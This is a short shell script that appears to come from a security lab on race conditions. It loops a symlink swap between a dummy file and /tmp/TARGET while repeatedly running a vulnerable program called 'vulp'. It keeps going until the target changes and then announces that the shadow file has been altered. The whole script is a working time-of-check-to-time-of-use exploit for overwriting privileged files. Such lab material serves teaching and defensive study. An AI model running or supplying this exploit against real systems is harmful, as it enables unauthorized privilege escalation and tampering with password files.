#!/bin/sh


old=`ls -l /tmp/TARGET`
new=`ls -l /tmp/TARGET`


rm dummy
touch dummy

while [ "$old" = "$new" ]
do
	rm /tmp/XYZ
	ln -s dummy /tmp/XYZ
	./vulp < input.txt &
	rm /tmp/XYZ
    	ln -s /tmp/TARGET /tmp/XYZ	

	new=`ls -l /tmp/TARGET`
done

echo "STOP... The shadow file has been changed"
